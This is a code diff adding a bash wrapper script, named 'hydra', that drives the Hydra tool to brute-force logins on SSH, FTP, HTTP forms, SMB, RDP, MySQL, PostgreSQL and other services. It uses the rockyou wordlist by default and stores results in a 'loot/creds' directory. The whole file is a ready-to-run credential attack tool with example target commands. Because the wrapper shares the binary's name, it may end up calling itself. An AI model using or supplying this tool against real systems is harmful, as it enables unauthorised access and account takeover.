@@ -1,0 +1,210 @@
+#!/bin/bash
+set -euo pipefail
+# /usr/local/bin/hydra
+# Online credential brute-force wrapper (Hydra)
+# Usage: hydra <mode> [options]
+# Modes: ssh, ftp, http, smb, rdp, mysql, postgres, custom, help
+
+LOOT="/opt/cardputer/loot/creds"
+WORDLISTS="/usr/share/wordlists"
+mkdir -p "$LOOT"
+
+check_hydra() {
+    if ! command -v hydra &>/dev/null; then
+        echo "[!] Hydra not found. Install: apt install hydra"
+        exit 1
+    fi
+}
+
+case "${1:-help}" in
+    ssh|--ssh)
+        check_hydra
+        TARGET="${2:-}"
+        USER="${3:-}"
+        USERLIST="${3:-}"
+        PASSLIST="${4:-$WORDLISTS/rockyou.txt}"
+        THREADS="${5:-4}"
+
+        if [ -z "$TARGET" ]; then
+            echo "Usage: hydra ssh <target> <user|userlist> [passlist] [threads]"
+            echo ""
+            echo "Brute-force SSH credentials."
+            echo ""
+            echo "Examples:"
+            echo "  hydra ssh 192.168.1.1 root /usr/share/wordlists/rockyou.txt"
+            echo "  hydra ssh 192.168.1.1 users.txt passwords.txt 8"
+            exit 1
+        fi
+
+        echo "[*] Hydra SSH Brute-Force"
+        echo "[*] Target: $TARGET"
+        echo ""
+
+        if echo "$USER" | grep -q '\.txt$\|\.lst$'; then
+            hydra -L "$USERLIST" -P "$PASSLIST" -t "$THREADS" -vV "$TARGET" ssh 2>&1 | tee "$LOOT/hydra_ssh_${TARGET}_$(date +%Y%m%d_%H%M%S).txt"
+        else
+            hydra -l "$USER" -P "$PASSLIST" -t "$THREADS" -vV "$TARGET" ssh 2>&1 | tee "$LOOT/hydra_ssh_${TARGET}_$(date +%Y%m%d_%H%M%S).txt"
+        fi
+        ;;
+
+    ftp|--ftp)
+        check_hydra
+        TARGET="${2:-}"
+        USER="${3:-root}"
+        PASSLIST="${4:-$WORDLISTS/rockyou.txt}"
+        THREADS="${5:-4}"
+
+        if [ -z "$TARGET" ]; then
+            echo "Usage: hydra ftp <target> [user] [passlist] [threads]"
+            exit 1
+        fi
+
+        echo "[*] Hydra FTP Brute-Force: $TARGET"
+        hydra -l "$USER" -P "$PASSLIST" -t "$THREADS" -vV "$TARGET" ftp 2>&1 | tee "$LOOT/hydra_ftp_${TARGET}_$(date +%Y%m%d_%H%M%S).txt"
+        ;;
+
+    http|--http)
+        check_hydra
+        TARGET="${2:-}"
+        USER="${3:-admin}"
+        PASSLIST="${4:-$WORDLISTS/rockyou.txt}"
+        PATH_URL="${5:-/login}"
+
+        if [ -z "$TARGET" ]; then
+            echo "Usage: hydra http <target> [user] [passlist] [path]"
+            echo ""
+            echo "Brute-force HTTP POST login form."
+            echo "Default path: /login"
+            echo ""
+            echo "Examples:"
+            echo "  hydra http 192.168.1.1 admin /usr/share/wordlists/rockyou.txt /login"
+            echo "  hydra http 192.168.1.1 admin passlist.txt /wp-login.php"
+            exit 1
+        fi
+
+        echo "[*] Hydra HTTP Brute-Force: $TARGET$PATH_URL"
+        hydra -l "$USER" -P "$PASSLIST" "$TARGET" http-post-form "$PATH_URL:user=^USER^&pass=^PASS^:F=incorrect" 2>&1 | tee "$LOOT/hydra_http_${TARGET}_$(date +%Y%m%d_%H%M%S).txt"
+        ;;
+
+    smb|--smb)
+        check_hydra
+        TARGET="${2:-}"
+        USER="${3:-administrator}"
+        PASSLIST="${4:-$WORDLISTS/rockyou.txt}"
+        THREADS="${5:-4}"
+
+        if [ -z "$TARGET" ]; then
+            echo "Usage: hydra smb <target> [user] [passlist] [threads]"
+            exit 1
+        fi
+
+        echo "[*] Hydra SMB Brute-Force: $TARGET"
+        hydra -l "$USER" -P "$PASSLIST" -t "$THREADS" -vV "$TARGET" smb 2>&1 | tee "$LOOT/hydra_smb_${TARGET}_$(date +%Y%m%d_%H%M%S).txt"
+        ;;
+
+    rdp|--rdp)
+        check_hydra
+        TARGET="${2:-}"
+        USER="${3:-administrator}"
+        PASSLIST="${4:-$WORDLISTS/rockyou.txt}"
+        THREADS="${5:-1}"
+
+        if [ -z "$TARGET" ]; then
+            echo "Usage: hydra rdp <target> [user] [passlist] [threads]"
+            exit 1
+        fi
+
+        echo "[*] Hydra RDP Brute-Force: $TARGET"
+        hydra -l "$USER" -P "$PASSLIST" -t "$THREADS" -vV "$TARGET" rdp 2>&1 | tee "$LOOT/hydra_rdp_${TARGET}_$(date +%Y%m%d_%H%M%S).txt"
+        ;;
+
+    mysql|--mysql)
+        check_hydra
+        TARGET="${2:-}"
+        USER="${3:-root}"
+        PASSLIST="${4:-$WORDLISTS/rockyou.txt}"
+        THREADS="${5:-4}"
+
+        if [ -z "$TARGET" ]; then
+            echo "Usage: hydra mysql <target> [user] [passlist] [threads]"
+            exit 1
+        fi
+
+        echo "[*] Hydra MySQL Brute-Force: $TARGET"
+        hydra -l "$USER" -P "$PASSLIST" -t "$THREADS" -vV "$TARGET" mysql 2>&1 | tee "$LOOT/hydra_mysql_${TARGET}_$(date +%Y%m%d_%H%M%S).txt"
+        ;;
+
+    postgres|--postgres)
+        check_hydra
+        TARGET="${2:-}"
+        USER="${3:-postgres}"
+        PASSLIST="${4:-$WORDLISTS/rockyou.txt}"
+        THREADS="${5:-4}"
+
+        if [ -z "$TARGET" ]; then
+            echo "Usage: hydra postgres <target> [user] [passlist] [threads]"
+            exit 1
+        fi
+
+        echo "[*] Hydra PostgreSQL Brute-Force: $TARGET"
+        hydra -l "$USER" -P "$PASSLIST" -t "$THREADS" -vV "$TARGET" postgres 2>&1 | tee "$LOOT/hydra_postgres_${TARGET}_$(date +%Y%m%d_%H%M%S).txt"
+        ;;
+
+    custom|--custom|-c)
+        check_hydra
+        TARGET="${2:-}"
+        PROTOCOL="${3:-}"
+        USER="${4:-admin}"
+        PASSLIST="${5:-$WORDLISTS/rockyou.txt}"
+        PORT="${6:-}"
+
+        if [ -z "$TARGET" ] || [ -z "$PROTOCOL" ]; then
+            echo "Usage: hydra custom <target> <protocol> [user] [passlist] [port]"
+            echo ""
+            echo "Custom protocol brute-force."
+            echo "Protocols: ssh, ftp, http-get, http-post, smtp, pop3, imap,"
+            echo "  mssql, oracle, snmp, telnet, vnc, rdp, smb, mysql, postgres"
+            exit 1
+        fi
+
+        PORT_OPT=""
+        [ -n "$PORT" ] && PORT_OPT="-s $PORT"
+
+        echo "[*] Hydra Custom Brute-Force: $TARGET ($PROTOCOL)"
+        hydra -l "$USER" -P "$PASSLIST" $PORT_OPT -vV "$TARGET" "$PROTOCOL" 2>&1 | tee "$LOOT/hydra_${PROTOCOL}_${TARGET}_$(date +%Y%m%d_%H%M%S).txt"
+        ;;
+
+    help|--help|-h)
+        echo "Usage: hydra <mode> [options]"
+        echo ""
+        echo "Online Credential Brute-Force Wrapper"
+        echo ""
+        echo "Modes:"
+        echo "  ssh <target> <user|userlist> [passlist] [threads]"
+        echo "  ftp <target> [user] [passlist] [threads]"
+        echo "  http <target> [user] [passlist] [path]"
+        echo "  smb <target> [user] [passlist] [threads]"
+        echo "  rdp <target> [user] [passlist] [threads]"
+        echo "  mysql <target> [user] [passlist] [threads]"
+        echo "  postgres <target> [user] [passlist] [threads]"
+        echo "  custom <target> <protocol> [user] [passlist] [port]"
+        echo ""
+        echo "Default wordlist: $WORDLISTS/rockyou.txt"
+        echo ""
+        echo "Examples:"
+        echo "  hydra ssh 192.168.1.1 root"
+        echo "  hydra ssh 192.168.1.1 users.txt passwords.txt 8"
+        echo "  hydra http 10.0.0.1 admin rockyou.txt /login"
+        echo "  hydra smb 192.168.1.1 administrator"
+        echo "  hydra custom 192.168.1.1 telnet admin"
+        echo ""
+        echo "Requirement: hydra (apt install hydra)"
+        exit 0
+        ;;
+
+    *)
+        echo "[!] Unknown mode: $1"
+        echo "Run: hydra help"
+        exit 1
+        ;;
+esac
